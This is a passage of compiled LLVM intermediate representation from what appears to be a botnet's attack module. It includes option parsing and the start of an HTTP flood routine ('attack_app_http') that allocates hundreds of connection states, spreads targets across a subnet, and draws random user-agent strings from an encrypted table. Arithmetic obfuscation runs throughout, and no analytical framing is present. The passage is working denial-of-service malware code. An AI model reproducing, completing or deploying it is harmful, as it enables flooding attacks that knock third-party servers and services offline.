  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %44

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %10, align 4
  br label %11

; <label>:42:                                     ; preds = %11
  %43 = load i8*, i8** %9, align 8
  store i8* %43, i8** %5, align 8
  br label %44

; <label>:44:                                     ; preds = %42, %27
  %45 = load i8*, i8** %5, align 8
  ret i8* %45
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2898

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2898

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2898

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2898

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %140, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %146

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %139

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %139

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub i32 %133, -110923145
  %135 = sub i32 %134, 32
  %136 = add i32 %135, -110923145
  %137 = sub nsw i32 %133, 32
  %138 = trunc i32 %136 to i8
  store i8 %138, i8* %131, align 1
  br label %139

; <label>:139:                                    ; preds = %127, %119, %111
  br label %140

; <label>:140:                                    ; preds = %139
  %141 = load i32, i32* %10, align 4
  %142 = add i32 %141, 1890715449
  %143 = add i32 %142, 1
  %144 = sub i32 %143, 1890715449
  %145 = add nsw i32 %141, 1
  store i32 %144, i32* %10, align 4
  br label %106

; <label>:146:                                    ; preds = %106
  %147 = load i32, i32* %18, align 4
  %148 = icmp sgt i32 %147, 500
  br i1 %148, label %149, label %150

; <label>:149:                                    ; preds = %146
  store i32 500, i32* %18, align 4
  br label %150

; <label>:150:                                    ; preds = %149, %146
  call void @table_unlock_val(i8 zeroext 36)
  call void @table_unlock_val(i8 zeroext 37)
  call void @table_unlock_val(i8 zeroext 38)
  call void @table_unlock_val(i8 zeroext 39)
  call void @table_unlock_val(i8 zeroext 40)
  call void @table_unlock_val(i8 zeroext 41)
  call void @table_unlock_val(i8 zeroext 42)
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  %151 = load i32, i32* %18, align 4
  %152 = sext i32 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 3140) #6
  %154 = bitcast i8* %153 to %struct.attack_http_state*
  store %struct.attack_http_state* %154, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %155

; <label>:155:                                    ; preds = %445, %150
  %156 = load i32, i32* %9, align 4
  %157 = load i32, i32* %18, align 4
  %158 = icmp slt i32 %156, %157
  br i1 %158, label %159, label %450

; <label>:159:                                    ; preds = %155
  %160 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %163, i32 0, i32 1
  store i8 0, i8* %164, align 4
  %165 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %168, i32 0, i32 0
  store i32 -1, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = load i8, i8* %5, align 1
  %173 = zext i8 %172 to i32
  %174 = srem i32 %171, %173
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %182, i32 0, i32 4
  store i32 %178, i32* %183, align 4
  %184 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %187, i32 0, i32 6
  %189 = getelementptr inbounds [257 x i8], [257 x i8]* %188, i32 0, i32 0
  %190 = load i8*, i8** %17, align 8
  %191 = call i32 @util_strcpy(i8* %189, i8* %190)
  %192 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %195, i32 0, i32 6
  %197 = getelementptr inbounds [257 x i8], [257 x i8]* %196, i64 0, i64 0
  %198 = load i8, i8* %197, align 4
  %199 = sext i8 %198 to i32
  %200 = icmp ne i32 %199, 47
  br i1 %200, label %201, label %229

; <label>:201:                                    ; preds = %159
  %202 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %205, i32 0, i32 6
  %207 = getelementptr inbounds [257 x i8], [257 x i8]* %206, i32 0, i32 0
  %208 = getelementptr inbounds i8, i8* %207, i64 1
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i32 0, i32 0
  %215 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %218, i32 0, i32 6
  %220 = getelementptr inbounds [257 x i8], [257 x i8]* %219, i32 0, i32 0
  %221 = call i32 @util_strlen(i8* %220)
  %222 = sext i32 %221 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %208, i8* %214, i64 %222, i32 1, i1 false)
  %223 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %226, i32 0, i32 6
  %228 = getelementptr inbounds [257 x i8], [257 x i8]* %227, i64 0, i64 0
  store i8 47, i8* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %201, %159
  %230 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %233, i32 0, i32 10
  %235 = getelementptr inbounds [9 x i8], [9 x i8]* %234, i32 0, i32 0
  %236 = load i8*, i8** %15, align 8
  %237 = call i32 @util_strcpy(i8* %235, i8* %236)
  %238 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %241, i32 0, i32 9
  %243 = getelementptr inbounds [9 x i8], [9 x i8]* %242, i32 0, i32 0
  %244 = load i8*, i8** %15, align 8
  %245 = call i32 @util_strcpy(i8* %243, i8* %244)
  %246 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %249, i32 0, i32 7
  %251 = getelementptr inbounds [129 x i8], [129 x i8]* %250, i32 0, i32 0
  %252 = load i8*, i8** %16, align 8
  %253 = call i32 @util_strcpy(i8* %251, i8* %252)
  %254 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %255 = load i32, i32* %9, align 4
  %256 = load i8, i8* %5, align 1
  %257 = zext i8 %256 to i32
  %258 = srem i32 %255, %257
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %259
  %261 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i32 0, i32 2
  %262 = load i8, i8* %261, align 4
  %263 = zext i8 %262 to i32
  %264 = icmp slt i32 %263, 32
  br i1 %264, label %265, label %298

; <label>:265:                                    ; preds = %229
  %266 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %267 = load i32, i32* %9, align 4
  %268 = load i8, i8* %5, align 1
  %269 = zext i8 %268 to i32
  %270 = srem i32 %267, %269
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i64 %271
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i32 0, i32 1
  %274 = load i32, i32* %273, align 4
  %275 = call i32 @ntohl(i32 %274) #7
  %276 = call i32 @rand_next()
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = load i8, i8* %5, align 1
  %280 = zext i8 %279 to i32
  %281 = srem i32 %278, %280
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %282
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i32 0, i32 2
  %285 = load i8, i8* %284, align 4
  %286 = zext i8 %285 to i32
  %287 = lshr i32 %276, %286
  %288 = add i32 %275, 941802616
  %289 = add i32 %288, %287
  %290 = sub i32 %289, 941802616
  %291 = add i32 %275, %287
  %292 = call i32 @htonl(i32 %290) #7
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 4
  store i32 %292, i32* %297, align 4
  br label %298

; <label>:298:                                    ; preds = %265, %229
  %299 = call i32 @rand_next()
  %300 = urem i32 %299, 15
  switch i32 %300, label %436 [
    i32 0, label %301
    i32 1, label %310
    i32 2, label %319
    i32 3, label %328
    i32 4, label %337
    i32 5, label %346
    i32 6, label %355
    i32 7, label %364
    i32 8, label %373
    i32 9, label %382
    i32 10, label %391
    i32 11, label %400
    i32 12, label %409
    i32 13, label %418
    i32 14, label %427
  ]

; <label>:301:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 47)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i32 0, i32 0
  %308 = call i8* @table_retrieve_val(i32 47, i32* null)
  %309 = call i32 @util_strcpy(i8* %307, i8* %308)
  call void @table_lock_val(i8 zeroext 47)
  br label %436

; <label>:310:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 48)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 48, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 48)
  br label %436

; <label>:319:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 49)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 49, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 49)
  br label %436

; <label>:328:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 50)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 50, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 50)
  br label %436

; <label>:337:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 51)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i32 0, i32 0
  %344 = call i8* @table_retrieve_val(i32 51, i32* null)
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  call void @table_lock_val(i8 zeroext 51)
  br label %436

; <label>:346:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 52)
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 5
  %352 = getelementptr inbounds [512 x i8], [512 x i8]* %351, i32 0, i32 0
  %353 = call i8* @table_retrieve_val(i32 52, i32* null)
  %354 = call i32 @util_strcpy(i8* %352, i8* %353)
  call void @table_lock_val(i8 zeroext 52)
  br label %436

; <label>:355:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 53)
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 5
  %361 = getelementptr inbounds [512 x i8], [512 x i8]* %360, i32 0, i32 0
  %362 = call i8* @table_retrieve_val(i32 53, i32* null)
  %363 = call i32 @util_strcpy(i8* %361, i8* %362)
  call void @table_lock_val(i8 zeroext 53)
  br label %436

; <label>:364:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 54)
  %365 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %368, i32 0, i32 5
  %370 = getelementptr inbounds [512 x i8], [512 x i8]* %369, i32 0, i32 0
  %371 = call i8* @table_retrieve_val(i32 54, i32* null)
  %372 = call i32 @util_strcpy(i8* %370, i8* %371)
  call void @table_lock_val(i8 zeroext 54)
  br label %436

; <label>:373:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 55)
  %374 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %377, i32 0, i32 5
  %379 = getelementptr inbounds [512 x i8], [512 x i8]* %378, i32 0, i32 0
  %380 = call i8* @table_retrieve_val(i32 55, i32* null)
  %381 = call i32 @util_strcpy(i8* %379, i8* %380)
  call void @table_lock_val(i8 zeroext 55)
  br label %436

; <label>:382:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 56)
  %383 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %386, i32 0, i32 5
  %388 = getelementptr inbounds [512 x i8], [512 x i8]* %387, i32 0, i32 0
  %389 = call i8* @table_retrieve_val(i32 56, i32* null)
  %390 = call i32 @util_strcpy(i8* %388, i8* %389)
  call void @table_lock_val(i8 zeroext 56)
  br label %436

; <label>:391:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 57)
  %392 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %395, i32 0, i32 5
  %397 = getelementptr inbounds [512 x i8], [512 x i8]* %396, i32 0, i32 0
  %398 = call i8* @table_retrieve_val(i32 57, i32* null)
  %399 = call i32 @util_strcpy(i8* %397, i8* %398)
  call void @table_lock_val(i8 zeroext 57)
  br label %436

; <label>:400:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 58)
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i32 0, i32 5
  %406 = getelementptr inbounds [512 x i8], [512 x i8]* %405, i32 0, i32 0
  %407 = call i8* @table_retrieve_val(i32 58, i32* null)
  %408 = call i32 @util_strcpy(i8* %406, i8* %407)
  call void @table_lock_val(i8 zeroext 58)
  br label %436

; <label>:409:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 59)
  %410 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %411 = load i32, i32* %9, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %413, i32 0, i32 5
  %415 = getelementptr inbounds [512 x i8], [512 x i8]* %414, i32 0, i32 0
  %416 = call i8* @table_retrieve_val(i32 59, i32* null)
  %417 = call i32 @util_strcpy(i8* %415, i8* %416)
  call void @table_lock_val(i8 zeroext 59)
  br label %436

; <label>:418:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 60)
